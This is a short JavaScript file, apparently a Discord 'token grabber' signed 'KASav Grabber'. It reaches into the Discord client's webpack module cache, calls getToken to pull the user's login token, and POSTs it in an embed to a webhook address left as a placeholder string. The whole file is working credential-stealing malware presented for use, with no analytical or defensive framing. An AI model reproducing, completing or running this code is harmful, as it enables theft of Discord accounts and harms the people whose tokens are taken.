const webhook = 'webhook';

var req = webpackJsonp.push([
    [], {
        extra_id: (e, t, r) => e.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
    }

function Token() {
    var e = new XMLHttpRequest;
    e.open("POST", webhook), e.setRequestHeader("Content-type", "application/json");
    var t = {
        username: "KASav Grabber",
        avatar_url: "https://cdn.discordapp.com/avatars/785243091811827772/a_346d756164795ea1f1b40b95feee4d0d.gif",
        content: "",
        embeds: [{
            color: "4700374",
            description: `Token: ${token}`,
            footer: {
                text: "By KASav'Nooby#0001"
            }
        }]
    };
    e.send(JSON.stringify(t))
}
Token();